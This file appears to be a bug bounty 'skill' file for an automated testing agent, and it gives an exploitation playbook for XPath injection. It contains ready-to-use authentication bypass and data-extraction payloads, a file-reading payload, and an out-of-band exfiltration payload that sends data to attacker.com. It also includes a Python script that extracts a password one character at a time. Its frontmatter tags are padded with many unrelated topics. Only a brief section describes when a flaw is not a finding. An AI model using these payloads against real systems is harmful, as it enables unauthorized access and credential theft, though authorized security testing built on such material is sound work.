---
name: "xpath-injection"
version: "2.0"
category: "injection"
subcategory: "xpath"
phase: "exploitation"
tags: ["authentication-bypass", "bug-bounty", "injection", "xml", "xpath", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["burp-intruder", "adb", "burp", "ghauri", "sqlmap", "xcat", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["xxe", "ssrf", "information-disclosure-harvesting"]
prerequisite_skills: ["recon-endpoint"]
description: "Bug bounty skill: xpath injection - exploitation phase, injection category"
---
# XPATH Injection

## Summary

XPath Injection is an attack technique that exploits applications constructing XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. It can be used to bypass authentication, extract arbitrary XML data, and in some cases exfiltrate data via out-of-band channels.

## Key Concepts

- **XPath**: A query language for selecting nodes from XML documents — similar to SQL but for XML structures.
- **No Authentication Layer**: Unlike SQL databases, XPath has no built-in access control — if the query runs, the data is accessible.
- **Blind XPath Injection**: When output is not directly visible, use boolean conditions (`true/false`), string length checks, and substring comparisons.
- **OOB Exfiltration**: Use `doc()` or `doc-available()` functions to send data to an attacker-controlled server via HTTP requests.
- **Schema Enumeration**: Count child nodes recursively to map the XML structure, then extract tag names character by character.

## Technical Details

### XPath Syntax Reference

#### Node Selectors

| Expression | Description |
|------------|-------------|
| `nodename` | Selects all nodes with name "nodename" |
| `/` | Selects from the root node |
| `//` | Selects nodes anywhere in the document |
| `.` | Selects the current node |
| `..` | Selects the parent of the current node |
| `@` | Selects attributes |
| `*` | Matches any element node |
| `@*` | Matches any attribute node |
| `node()` | Matches any node of any kind |

#### Predicates

| Expression | Description |
|------------|-------------|
| `/bookstore/book[1]` | First child (1-indexed per W3C) |
| `/bookstore/book[last()]` | Last child |
| `/bookstore/book[position()<3]` | First two children |
| `//title[@lang='en']` | Filter by attribute value |
| `/bookstore/book[price>35.00]` | Filter by child value |

### Example XML Document

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
    <name>pepe</name>
    <password>peponcio</password>
    <account>admin</account>
</user>
<user>
    <name>mark</name>
    <password>m12345</password>
    <account>regular</account>
</user>
<user>
    <name>fino</name>
    <password>fino2</password>
    <account>regular</account>
</user>
</data>
```

#### Common Queries

```
# All names
//name
//user/name

# All values
//user/node()
//user/child::node()

# Position-based selection
//user[position()=1]/name           # pepe
//user[last()-1]/name               # mark
//user[position()=1]/child::node()[position()=2]  # peponcio (password)

# Functions
count(//user/node())                # 9 (total values)
string-length(//user[1]/name)       # 4 (length of "pepe")
substring(//user[2]/name,2,1)       # "a" (pos=2, length=1 from "mark")
```

### Blind XPath

When the output is not directly visible, use boolean conditions:

```
' or string-length(//user[1]/name)=4 or ''='    # True if length=4
' or substring(//user[1]/name,1,1)="a" or ''='  # True if first char is "a"
```

## Methodology

1. **Identify input points** — Find parameters used in XPath queries (search, login, document lookup, user profile).

2. **Probe for injection** — Inject `' or '1'='1` and related variants. If behavior changes or errors appear, XPath injection is likely.

3. **Authentication bypass** — If the query is an auth check like `//user[name='input' and password='input']/account`, inject payloads to always return a match (see Payloads section).

4. **Map the XML schema** — Recursively count child nodes using boolean conditions:
   - `and count(/*)=1` — root has 1 child?
   - `and count(/*[1]/*)=2` — root's first child has 2 children?
   - Continue until structure is known.

5. **Extract tag names** — Use `name(/*[1]/*[1])` and `substring(name(...),1,1)` comparisons to reveal tag names character by character.

6. **Extract data** — Use `string-length()` and `substring()` to extract values blindly; or craft a query that directly returns the data in the response.

7. **Exfiltrate via OOB** — If no direct output is possible, use `doc()` or `doc-available()` to send data to your server via HTTP:
   - `doc(concat("http://attacker.com/", name(/*[1]/*[1])))`

## Detection Commands

```
# Basic probe — true condition
' or '1'='1

# Basic probe — false condition
' or '1'='2

# Check for length detection
' or string-length(//user[1]/name)=4 or ''='

# Check for character detection
' or substring(//user[1]/name,1,1)="a" or ''='

# Error-based — trigger error if condition fails
and ( if ( $employee/role = 2 ) then error() else 0 )
```

## Exploitation Payloads

### Authentication Bypass

Bypass queries of the form:
- `string(//user[name/text()='VAR_USER' and password/text()='VAR_PASSWD']/account/text())`
- `/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]'

```
# OR bypass in both fields
' or '1'='1

# OR bypass with empty string
' or ''='

# Null injection (terminate string early)
' or 1]%00

# Double OR in username or password (valid with one vulnerable field)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
```

### Account Selection with OR

```
# Select first account
' or position()=1 or '
' or string-length(name(.))<10 or '
' or contains(name(),'adm') or '

# Select 2nd account
' or position()=2 or '

# Select with known name
admin' or '
admin' or '1'='2
```

### Data Extraction

If the query returns matching strings that can be observed:

```
# Get all names
') or 1=1 or ('

# Get all names and passwords
') or 1=1] | //user/password[('')=('

# Get all values (using union-like syntax)
')] | //./node()[('')=('
')] | //node()[('')=('
')] | //user/*[3] | a[('              # All passwords
')] | //user/*[4] | a[('              # All account types

# Null injection extraction
')] | //password%00
```

### Blind Extraction

```
# Length check
' or string-length(//user[1]/name)=4 or ''='

# Character check
' or substring(//user[1]/name,1,1)="a" or ''='

# Codepoint check
' or string-to-codepoints(substring(//user[1]/name,1,1))=97 or ''='
```

### File Reading

```
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```

## Commands

```python
# Python blind XPath extraction
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
    r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
    if ("TRUE_COND" in r.text):
        l = i
        break
print("[+] Password length:", l)
for i in range(1, l+1):
    for al in alphabet:
        r = requests.get("http://example.com?action=user&userid=2 and substring(password," + str(i) + ",1)=" + al)
        if ("TRUE_COND" in r.text):
            flag += al
            print("[+] Flag:", flag)
            break
```

## Tools

- **xcat** — Automatic XPath injection exploitation tool (https://xcat.readthedocs.io/)

## Bypass Techniques

- **OR injection**: `' or '1'='1` — bypasses authentication by making the predicate always true.
- **Null byte injection**: `' or 1]%00` — terminates the query string early, ignoring the rest of the query.
- **Union-like syntax**: `')] | //password%00` — appends additional node selections using `|` (union operator).
- **Error-based**: `and ( if ( $employee/role = 2 ) then error() else 0 )` — triggers errors for conditional blind extraction.
- **OOB exfiltration**: `doc(concat("http://attacker.com/", name(/*[1]/*[1])))` — sends data via HTTP request.

## Not a Finding If

- **Input is properly parameterized** — If the XPath query uses pre-compiled expressions with parameter binding (not string concatenation), injection is not possible.
- **XML is static and not user-queryable** — If no XPath query is constructed from user input, there is no vulnerability.
- **OOB functions disabled** — If `doc()` and `doc-available()` are disabled in the XPath processor, OOB exfiltration is blocked; blind techniques may still work.

## Notes

- XPath has **no access control** — unlike SQL databases with user permissions, XPath queries operate on the entire XML document.
- Schema enumeration is noisy but essential for blind exploitation — count child nodes, then extract tag names and values.
- Boolean-based blind XPath is slow but reliable; automate with Python or xcat.
- The `|` (pipe) operator in XPath acts like UNION in SQL — it combines node sets from multiple path expressions.

## References

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection
- https://www.w3schools.com/xml/xpath_syntax.asp
- https://xcat.readthedocs.io/
